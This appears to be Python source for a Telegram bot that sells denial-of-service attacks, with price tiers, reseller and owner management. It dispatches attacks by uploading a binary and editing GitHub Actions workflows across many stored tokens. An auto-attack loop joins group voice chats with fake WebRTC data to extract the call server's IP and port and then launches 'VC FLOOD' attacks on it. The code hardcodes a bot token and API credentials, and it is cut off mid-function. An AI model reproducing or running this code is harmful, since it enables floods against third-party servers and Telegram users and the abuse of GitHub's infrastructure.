import os
import json
import logging
import threading
import asyncio
import time
import random
import string
import ipaddress
import inspect                         
import re                               

try:
    asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler,
    filters, CallbackQueryHandler
)
from github import Github, GithubException, Auth

# ─── IP PANEL: pyrogram (optional — agar installed nahi hai to bot crash nahi hoga) ───
try:
    from pyrogram import Client as PyroClient
    from pyrogram.raw.functions.channels import GetFullChannel
    from pyrogram.raw.functions.phone import JoinGroupCall, LeaveGroupCall
    from pyrogram.raw.types import DataJSON
    PYROGRAM_AVAILABLE = True
except ImportError:
    PYROGRAM_AVAILABLE = False
    PyroClient = None
    GetFullChannel = None
    JoinGroupCall = None
    LeaveGroupCall = None
    DataJSON = None


_SUPPORTS_STYLE = "style" in inspect.signature(InlineKeyboardButton.__init__).parameters
_SUPPORTS_KBD_STYLE = "style" in inspect.signature(KeyboardButton.__init__).parameters


def kbtn(text, style=None, **kwargs):
    """KeyboardButton wrapper with optional colored style.
    Silently ignores `style` on older PTB versions.
    """
    if style and _SUPPORTS_KBD_STYLE:
        kwargs["style"] = style
    return KeyboardButton(text, **kwargs)


def cbtn(text, callback_data=None, url=None, style=None):
    """InlineKeyboardButton wrapper with optional colored style.
    Silently ignores `style` on older PTB versions.
    """
    kwargs = {}
    if style and _SUPPORTS_STYLE:
        kwargs["style"] = style

    if url is not None:
        return InlineKeyboardButton(text, url=url, **kwargs)
    return InlineKeyboardButton(text, callback_data=callback_data, **kwargs)


logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── IP PANEL CONFIG ───
IP_API_ID = 31630732
IP_API_HASH = "e36c43c1bca68376fb9040cb849ddad1"
IP_SESSIONS_DIR = "sessions"
IP_ACCOUNTS_FILE = "accounts.json"
os.makedirs(IP_SESSIONS_DIR, exist_ok=True)

# ─── AUTO ATTACK config ───
AUTO_ATTACK_FILE = "auto_attacks.json"
AUTO_ATTACK_POLL_INTERVAL = 15
AUTO_ATTACK_DEFAULT_DURATION = 60

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8678496182:AAHGbnTh9AVMCHS13ZGs6ipvYu0QFu5nwkk").strip()
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "neo"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [8751106283, 8305984975]
NOTIFICATION_CHAT_IDS = [-1004376999626]
# Attack management
current_attack = None
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}

# IP PANEL runtime state
ip_clients = {}      # session_name -> Pyrogram Client
ip_accounts = {}     # session_name -> {phone, user_id, username, first_name, status}

# AUTO ATTACK runtime state
auto_attack_targets = {}
AUTO_ATTACK_LOOP_TASK = None
AUTO_ATTACK_BOT = None

# Temporary storage for multi-step operations
temp_data = {}
# Cache owner DM URL (populated on first /start, used by callback buttons)
_owner_dm_url_cache = None

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}


def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

def save_binary_file(binary_content):
    """Save binary file content to disk for later use"""
    try:
        with open(BINARY_STORAGE_PATH, 'wb') as f:
            f.write(binary_content)
        logger.info("✅ Binary file saved to storage")
        return True
    except Exception as e:
        logger.error(f"❌ Error saving binary file: {e}")
        return False

# ═══════════════════════════════════════════════════════════
#                    IP PANEL HELPERS
# ═══════════════════════════════════════════════════════════

def load_ip_accounts():
    try:
        with open(IP_ACCOUNTS_FILE, 'r') as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_ip_accounts(accounts):
    with open(IP_ACCOUNTS_FILE, 'w') as f:
        json.dump(accounts, f, indent=4, ensure_ascii=False)

def load_auto_attacks():
    try:
        with open(AUTO_ATTACK_FILE, 'r') as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_auto_attacks():
    with open(AUTO_ATTACK_FILE, 'w') as f:
        json.dump(auto_attack_targets, f, indent=2, ensure_ascii=False)
        
def valid_ip_session_name(name):
    return bool(re.fullmatch(r'[A-Za-z0-9_-]{1,50}', name or ''))

def get_random_ip_session():
    if not ip_accounts:
        return None
    return random.choice(list(ip_accounts.keys()))

async def get_ip_client(session_name):
    """Get or create a pyrogram client for the given session."""
    if not PYROGRAM_AVAILABLE:
        return None
    if session_name in ip_clients:
        return ip_clients[session_name]
    if session_name not in ip_accounts:
        return None
    if not valid_ip_session_name(session_name):
        return None

    session_path = os.path.join(IP_SESSIONS_DIR, session_name)
    client = PyroClient(session_path, api_id=IP_API_ID, api_hash=IP_API_HASH)
    await client.start()
    try:
        async for _ in client.get_dialogs(limit=200):
            pass
    except Exception as e:
        logger.warning("ip client warmup failed for %s: %s", session_name, e)

    ip_clients[session_name] = client
    return client

async def resolve_ip_chat(client, chat_input):
    """Resolve a chat safely, joining if needed."""
    chat = None
    last_err = None
    chat_input = str(chat_input).strip()

    try:
        cid = int(chat_input)
    except (ValueError, TypeError):
        cid = None

    if cid is not None:
        try:
            chat = await client.get_chat(cid)
        except Exception as e:
            last_err = e
        if chat is None:
            try:
                async for dialog in client.get_dialogs():
                    if dialog.chat and dialog.chat.id == cid:
                        chat = dialog.chat
                        break
            except Exception:
                pass
        if chat is None:
            raise last_err or ValueError(
                f"Chat `{cid}` is not known to this account. "
                "Use a link/username to join first."
            )
    else:
        try:
            chat = await client.get_chat(chat_input)
        except Exception as e:
            last_err = e
            try:
                chat = await client.join_chat(chat_input)
            except Exception as e2:
                try:
                    chat = await client.get_chat(chat_input)
                except Exception:
                    last_err = e2
        if chat is None:
            raise last_err or ValueError("Could not resolve chat")

    try:
        await client.resolve_peer(chat.id)
    except Exception:
        pass
    return chat

# Load saved accounts at startup
ip_accounts = load_ip_accounts()
auto_attack_targets = load_auto_attacks()

# ═══════════════════════════════════════════════════════════
#                    AUTO ATTACK ENGINE
# ═══════════════════════════════════════════════════════════

def _extract_ip_port_from_transport(transport):
    """Smart candidate extraction — IPv4 preferred, fallback IPv6"""
    if not transport:
        return None, None
    if 'ip' in transport and 'port' in transport:
        return transport.get('ip'), transport.get('port')
    candidates = transport.get('candidates') or []
    ipv4 = None
    ipv6 = None
    for c in candidates:
        ip = c.get('ip')
        port = c.get('port')
        if not ip or not port:
            continue
        if ':' in ip:
            if ipv6 is None:
                ipv6 = (ip, port)
        else:
            if ipv4 is None:
                ipv4 = (ip, port)
    return ipv4 or ipv6 or (None, None)

async def extract_vc_ip_for_chat(session_name, chat_id):
    client = await get_ip_client(session_name)
    if not client:
        raise RuntimeError(f"Client '{session_name}' unavailable")

    # Resolve peer with dialog refresh fallback
    try:
        peer = await client.resolve_peer(chat_id)
    except Exception:
        try:
            async for _ in client.get_dialogs(limit=500):
                pass
            peer = await client.resolve_peer(chat_id)
        except Exception as e:
            raise RuntimeError(f"resolve_peer failed: {e}")

    # Get VC info
    try:
        full = await client.invoke(GetFullChannel(channel=peer))
    except Exception as e:
        raise RuntimeError(f"GetFullChannel failed: {e}")

    if not full.full_chat.call:
        return None  # no VC

    call = full.full_chat.call
    logger.info(f"🎙️ [{session_name}] VC detected (id={call.id})")

    # ═══ STEP 1: Try GetGroupCall ═══
    try:
        from pyrogram.raw.functions.phone import GetGroupCall as RawGetGroupCall
        group_call = await client.invoke(RawGetGroupCall(call=call, limit=0))
        gc = group_call.call if hasattr(group_call, 'call') else None
        if gc and getattr(gc, 'params', None):
            try:
                params = json.loads(gc.params.data)
                ip, port = _extract_ip_port_from_transport(params.get('transport'))
                if ip and port:
                    logger.info(f"✅ [{session_name}] DIRECT: {ip}:{port}")
                    return ip, port
            except Exception as e:
                logger.debug(f"[{session_name}] direct parse fail: {e}")
    except Exception as e:
        err = str(e).lower()
        # ⟵ FIX: agar yahan hi GROUPCALL_INVALID aa gaya, toh VC end ho chuki hai
        if "groupcall_invalid" in err or "group_call_invalid" in err:
            logger.info(f"[{session_name}] VC already ended (GROUPCALL_INVALID on GetGroupCall)")
            return None
        logger.debug(f"[{session_name}] GetGroupCall failed: {e}")

    # ═══ STEP 2: Join with fake WebRTC ═══
    me = await client.get_me()
    fake_webrtc = json.dumps({
        "ufrag": "x", "pwd": "x",
        "fingerprints": [], "ssrc": 1,
    })

    try:
        join_result = await client.invoke(
            JoinGroupCall(
                call=call,
                join_as=await client.resolve_peer(me.id),
                params=DataJSON(data=fake_webrtc),
                muted=True,
                video_stopped=True,
            )
        )
    except Exception as e:
        err = str(e).lower()
        if any(k in err for k in ("banned", "kicked", "chat_write_forbidden", "user_banned")):
            raise RuntimeError(f"BANNED: {e}")
        # ⟵ FIX: detection ke baad VC end ho gayi → treat as "no VC"
        if "groupcall_invalid" in err or "group_call_invalid" in err:
            logger.info(f"[{session_name}] VC ended before join (GROUPCALL_INVALID)")
            return None
        raise RuntimeError(f"JoinGroupCall failed: {e}")

    # ═══ STEP 3: UpdateGroupCallConnection dhoondo ═══
    from pyrogram.raw.types import UpdateGroupCallConnection

    found_ip = None
    found_port = None
    ssrc = 0

    for upd in join_result.updates:
        if isinstance(upd, UpdateGroupCallConnection):
            try:
                pdata = json.loads(upd.params.data)
                ip, port = _extract_ip_port_from_transport(pdata.get('transport'))
                if ip and port:
                    found_ip, found_port = ip, port
                    ssrc = pdata.get('ssrc', 0)
                    logger.info(f"🎯 [{session_name}] JOIN: {ip}:{port} ssrc={ssrc}")
                    break
            except Exception as e:
                logger.warning(f"[{session_name}] parse update fail: {e}")

    # ═══ STEP 4: Leave ═══
    try:
        await client.invoke(LeaveGroupCall(call=call, source=ssrc or 0))
    except Exception:
        try:
            await client.invoke(LeaveGroupCall(call=call, source=0))
        except Exception as e:
            logger.debug(f"[{session_name}] leave fail: {e}")

    if found_ip and found_port:
        return found_ip, found_port

    logger.warning(f"[{session_name}] no transport in join response")
    return None


async def extract_vc_ip_with_fallback(chat_id_str, chat_id):
    """
    Try all non-banned sessions. Returns (ip, port, session_used, all_banned).
    """
    target = auto_attack_targets.get(chat_id_str, {})
    banned = target.get("banned_sessions", [])
    available = [s for s in ip_accounts.keys() if s not in banned]
    if not available:
        return None, None, None, True

    for session_name in available:
        try:
            result = await extract_vc_ip_for_chat(session_name, chat_id)
            if result:
                ip, port = result
                return ip, port, session_name, False
            # None → genuinely no VC, return immediately
            return None, None, session_name, False
        except Exception as e:
            err = str(e).lower()
            if "banned" in err or "kicked" in err or "chat_write_forbidden" in err:
                bs = target.setdefault("banned_sessions", [])
                if session_name not in bs:
                    bs.append(session_name)
                    save_auto_attacks()
                    logger.warning(f"🚫 {session_name} banned from {chat_id_str}")
                continue
            logger.warning(f"Session '{session_name}' failed: {e}")
            continue

    return None, None, None, False


async def trigger_auto_attack(ip, port, method, duration):
    if not github_tokens:
        logger.error("trigger_auto_attack: no tokens")
        return 0, 0

    logger.info(
        f"🚀 Auto dispatch: {ip}:{port} method={method} "
        f"dur={duration}s → {len(github_tokens)} tokens"
    )

    loop = asyncio.get_running_loop()
    results = await asyncio.gather(*[
        loop.run_in_executor(
            None, update_yml_file,
            td["token"], td["repo"], ip, port, duration, method
        )
        for td in github_tokens
    ], return_exceptions=True)

    for r, td in zip(results, github_tokens):
        if r is not True:
            logger.error(f"❌ {td['repo']} dispatch failed: {r}")

    success = sum(1 for r in results if r is True)
    logger.info(f"✅ Auto dispatch done: {success}/{len(results)}")
    return success, len(github_tokens)

async def send_notification(text: str):
    """Owners + NOTIFICATION_CHAT_IDS sabko message bhejta hai."""
    if not AUTO_ATTACK_BOT:
        return

    targets = set()  # duplicate se bachne ke liye

    # 1) Owners
    for oid in owners.keys():
        try:
            targets.add(int(oid))
        except (ValueError, TypeError):
            pass

    # 2) Hardcoded channel/group IDs
    for cid in NOTIFICATION_CHAT_IDS:
        try:
            targets.add(int(cid))
        except (ValueError, TypeError):
            pass

    # 3) Sabko bhejo (Markdown parse mode ke saath — taaki **bold** sahi dikhe)
    for tid in targets:
        try:
            await AUTO_ATTACK_BOT.send_message(tid, text, parse_mode="Markdown")
        except Exception as e:
            logger.warning(f"notify send to {tid} failed: {e}")


# ═══════════════════════════════════════════════════════════════════════
#                 💀   𝗔𝗨𝗧𝗢 - 𝗔𝗧𝗧𝗔𝗖𝗞   𝗘𝗡𝗚𝗜𝗡𝗘   💀
# ═══════════════════════════════════════════════════════════════════════

async def auto_attack_loop():
    logger.info("💀 Auto-attack loop STARTED")
    await asyncio.sleep(15)

    # ── per-chat runtime memory ──
    last_call_id: dict = {}   # chat_id_str → last seen call.id
    vc_was_on:    dict = {}   # chat_id_str → bool (was VC live last tick?)

    while True:
        try:
            # ─────────────────────────────────────────────
            #  🛑  NO TARGETS → idle sleep
            # ─────────────────────────────────────────────
            if not auto_attack_targets:
                await asyncio.sleep(AUTO_ATTACK_POLL_INTERVAL)
                continue

            for chat_id_str, target in list(auto_attack_targets.items()):
                if not target.get("enabled", True):
                    continue

                try:
                    chat_id = int(target.get("chat_id") or chat_id_str)
                    chat_title = target.get("chat_title", "?")

                    # ═══════════════════════════════════════════════
                    #              ⏱️   T I M E R   M O D E
                    # ═══════════════════════════════════════════════
                    if target.get("mode") == "timer":
                        interval       = target.get("interval", 60)
                        max_attacks    = target.get("max_attacks", 999999)
                        total_duration = target.get("total_duration", 0)
                        started_at     = target.get("started_at", time.time())
                        attacks_done   = target.get("attack_count", 0)

                        # ── auto-stop: duration reached ──
                        if total_duration > 0 and (time.time() - started_at) >= total_duration:
                            target["enabled"] = False
                            save_auto_attacks()
                            continue

                        # ── auto-stop: max attacks reached ──
                        if attacks_done >= max_attacks:
                            target["enabled"] = False
                            save_auto_attacks()
                            continue

                        # ── respect interval ──
                        if time.time() - target.get("last_attack_time", 0) < interval:
                            continue

                        # ── pick a session ──
                        session_name = target.get("session_name")
                        if not session_name or session_name not in ip_accounts:
                            session_name = next(iter(ip_accounts), None)
                            if not session_name:
                                continue

                        # ── extract VC IP ──
                        try:
                            ip_port = await extract_vc_ip_for_chat(session_name, chat_id)
                        except Exception as e:
                            logger.warning(f"⏱️ Timer extract fail [{session_name}]: {e}")
                            continue

                        # ── 🚀 fire ──
                        if ip_port:
                            ip, port = ip_port
                            method   = "VC FLOOD"
                            duration = target.get("attack_duration", AUTO_ATTACK_DEFAULT_DURATION)
                            success, total = await trigger_auto_attack(ip, port, method, duration)

                            target["last_ip"]              = ip
                            target["last_port"]            = port
                            target["last_attack_time"]     = time.time()
                            target["attack_count"]         = attacks_done + 1
                            target["last_success_servers"] = success
                            save_auto_attacks()

                            logger.info(
                                f"⏱️ Timer #{attacks_done + 1} on {chat_id_str}: "
                                f"{ip}:{port} ({success}/{total})"
                            )

                            # ✅ FIXED — notification (owners + channel/group)
                            await send_notification(
                                f"⏱️ **ᴛɪᴍᴇʀ ᴀᴛᴛᴀᴄᴋ #{attacks_done + 1}**\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"💬 {chat_title}\n"
                                f"🌐 `{ip}:{port}`\n"
                                f"🖥️ ꜱᴇʀᴠᴇʀꜱ: `{success}/{total}`"
                            )
                        continue

                    # ═══════════════════════════════════════════════
                    #           🔍   D E T E C T O R   M O D E
                    # ═══════════════════════════════════════════════
                    banned    = target.get("banned_sessions", [])
                    available = [s for s in ip_accounts.keys() if s not in banned]

                    # ── every session banned → stop ──
                    if not available:
                        logger.warning(f"🚫 All sessions banned for {chat_id_str}")
                        target["enabled"] = False
                        save_auto_attacks()

                        # ✅ FIXED — notification
                        await send_notification(
                            f"🚫 **ᴀʟʟ ꜱᴇꜱꜱɪᴏɴꜱ ʙᴀɴɴᴇᴅ**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💬 {chat_title}\n"
                            f"🆔 `{chat_id_str}`"
                        )
                        continue

                    # ─── sniff current VC ───
                    current_call_id = None
                    checked_ok      = False
                    for sname in available:
                        try:
                            client = await get_ip_client(sname)
                            if not client:
                                continue

                            try:
                                peer = await client.resolve_peer(chat_id)
                            except Exception:
                                try:
                                    async for _ in client.get_dialogs(limit=300):
                                        pass
                                    peer = await client.resolve_peer(chat_id)
                                except Exception:
                                    continue

                            full = await client.invoke(GetFullChannel(channel=peer))
                            current_call_id = full.full_chat.call.id if full.full_chat.call else None
                            checked_ok = True
                            break

                        except Exception as e:
                            err = str(e).lower()
                            if any(k in err for k in
                                   ("banned", "kicked", "chat_write_forbidden", "user_banned")):
                                bs = target.setdefault("banned_sessions", [])
                                if sname not in bs:
                                    bs.append(sname)
                                    save_auto_attacks()
                                    logger.warning(f"🚫 {sname} banned from {chat_id_str}")
                            continue

                    if not checked_ok:
                        continue

                    prev = last_call_id.get(chat_id_str, "UNSET")
                    logger.info(f"🔍 [{chat_id_str}] prev={prev} now={current_call_id}")

                    # ═══ VC OFF → reset + notify ═══
                    if current_call_id is None:
                        last_call_id[chat_id_str] = None
                        if vc_was_on.get(chat_id_str, False):
                            vc_was_on[chat_id_str] = False
                            logger.info(f"🔴 VC stopped on {chat_id_str}")

                            # ✅ FIXED — notification
                            await send_notification(
                                f"🔴 **ᴠᴄ ᴇɴᴅ**\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"🆔 `{chat_id_str}`\n"
                                f"👀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ɴᴇxᴛ ᴠᴄ..."
                            )
                        continue

                    # ═══ Same VC → already fired ═══
                    if prev == current_call_id:
                        continue

                    # ═══ 🎙️ NEW VC → FIRE ═══
                    last_call_id[chat_id_str] = current_call_id
                    vc_was_on[chat_id_str]    = True
                    logger.info(
                        f"💀 NEW VC on {chat_id_str} (prev={prev}, now={current_call_id})"
                    )

                    # ✅ FIXED — notification
                    await send_notification(
                        f"🎙️ **ᴠᴄ ᴏɴ !**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"💬 {chat_title}\n"
                        f"🆔 `{chat_id_str}`\n"
                        f"⚡ ᴀᴛᴛᴀᴄᴋɪɴɢ...."
                    )

                    ip, port, used_session, all_banned = await extract_vc_ip_with_fallback(
                        chat_id_str, chat_id
                    )

                    # ── every session banned → stop ──
                    if all_banned:
                        target["enabled"] = False
                        save_auto_attacks()

                        # ✅ FIXED — notification
                        await send_notification(
                            f"🚫 **ᴀʟʟ ꜱᴇꜱꜱɪᴏɴꜱ ʙᴀɴɴᴇᴅ** `{chat_id_str}`"
                        )
                        continue

                    # ── 🚀 fire ──
                    if ip:
                        method   = "VC FLOOD"
                        duration = target.get("attack_duration", AUTO_ATTACK_DEFAULT_DURATION)
                        success, total = await trigger_auto_attack(ip, port, method, duration)

                        target["last_ip"]              = ip
                        target["last_port"]            = port
                        target["last_attack_time"]     = time.time()
                        target["last_attack_method"]   = method
                        target["attack_count"]         = target.get("attack_count", 0) + 1
                        target["last_success_servers"] = success
                        target["last_session_used"]    = used_session
                        save_auto_attacks()

                        logger.info(f"💀 {ip}:{port} via '{used_session}' → {success}/{total}")

                        # ✅ FIXED — notification
                        icon = "✅" if success > 0 else "❌"
                        await send_notification(
                            f"{icon} **ᴀᴛᴛᴀᴄᴋ ʟᴀᴜɴᴄʜᴇᴅ...**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💬 {chat_title}\n"
                            f"🆔 `{chat_id_str}`\n"
                            f"🌐 `{ip}:{port}`\n"
                            f"📁 ꜱᴇꜱꜱɪᴏɴ: `{used_session}`\n"
                            f"🖥️ ꜱᴇʀᴠᴇʀꜱ: `{success}/{total}`"
                        )

                    # ── ⚠️ VC detected but IP extraction failed ──
                    else:
                        logger.warning(f"⚠️ No IP extracted for {chat_id_str}")

                        # ✅ FIXED — notification
                        await send_notification(
                            f"⚠️ **ᴠᴄ ᴅᴇᴛᴇᴄᴛᴇᴅ, ɪᴘ ꜰᴀɪʟ**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🆔 `{chat_id_str}`\n"
                            f"ꜱᴇꜱꜱɪᴏɴꜱ ᴛʀɪᴇᴅ: `{len(available)}`"
                        )

                except Exception as e:
                    logger.error(
                        f"auto-attack target {chat_id_str} error: {e}",
                        exc_info=True,
                    )

        except Exception as e:
            logger.error(f"auto-attack loop error: {e}", exc_info=True)

        await asyncio.sleep(AUTO_ATTACK_POLL_INTERVAL)
        
def load_binary_file():
    """Load saved binary file content"""
    try:
        if os.path.exists(BINARY_STORAGE_PATH):
            with open(BINARY_STORAGE_PATH, 'rb') as f:
                return f.read()
        return None
    except Exception as e:
        logger.error(f"❌ Error loading binary file: {e}")
        return None

def upload_binary_to_repo(token_data, binary_content):
    """Upload binary file to a specific repository"""
    try:
        # ✅ DeprecationWarning fix: auth=Auth.Token use karein
        g = Github(auth=Auth.Token(token_data['token']))
        repo = g.get_repo(token_data['repo'])

        try:
            existing_file = repo.get_contents(BINARY_FILE_NAME)
            repo.update_file(
                BINARY_FILE_NAME,
                "Update binary file",
                binary_content,
                existing_file.sha,
                branch="main"
            )
            logger.info(f"✅ Updated binary in {token_data['repo']}")
            return True, "Updated"
        except Exception:
            repo.create_file(
                BINARY_FILE_NAME,
                "Upload binary file",
                binary_content,
                branch="main"
            )
            logger.info(f"✅ Created binary in {token_data['repo']}")
            return True, "Created"
    except Exception as e:
        logger.error(f"❌ Error uploading binary to {token_data['repo']}: {e}")
        return False, str(e)

# Load all data
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)


def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    """Check if user can start a new attack"""
    global current_attack, cooldown_until

    if MAINTENANCE_MODE:
        return False, (
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ     ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ʙᴏᴛ ɪꜱ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.  │\n"
            "│  ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ.               │\n"
            "└────────────────────────────────┘"
        )

    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, (
            f"╔════════════════════════════════╗\n"
            f"║  ⚠️  ᴍᴀx ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ║\n"
            f"╚════════════════════════════════╝\n"
            f"┌────────────────────────────────┐\n"
            f"│  ʏᴏᴜ ʜᴀᴠᴇ ᴜꜱᴇᴅ ᴀʟʟ          │\n"
            f"│  {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(ꜱ).           │\n"
            f"│  ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ꜰᴏʀ ᴍᴏʀᴇ.    │\n"
            f"└────────────────────────────────┘"
        )

    if current_attack is not None:
        return False, (
            "╔════════════════════════════════╗\n"
            "║  ⚠️  ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ║\n"
            "╚════════════════════════════════╝\n"
            "┌────────────────────────────────┐\n"
            "│  ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ᴛʜᴇ      │\n"
            "│  ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ꜰɪɴɪꜱʜᴇꜱ.   │\n"
            "└────────────────────────────────┘"
        )

    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, (
            f"╔════════════════════════════════╗\n"
            f"║  ⏳  ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ     ║\n"
            f"╚════════════════════════════════╝\n"
            f"┌────────────────────────────────┐\n"
            f"│  ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ {remaining_time} ꜱᴇᴄᴏɴᴅꜱ   │\n"
            f"│  ʙᴇꜰᴏʀᴇ ꜱᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ. │\n"
            f"└────────────────────────────────┘"
        )

    return True, (
        "╔════════════════════════════════╗\n"
        "║  ✅  ʀᴇᴀᴅʏ ᴛᴏ ꜱᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ ║\n"
        "╚════════════════════════════════╝"
    )


def get_attack_method(ip):
    """Determine attack method based on IP"""
    if ip.startswith('91'):
        return "VC FLOOD", "ɢᴀᴍᴇ"
    elif ip.startswith(('15', '96')):
        return None, (
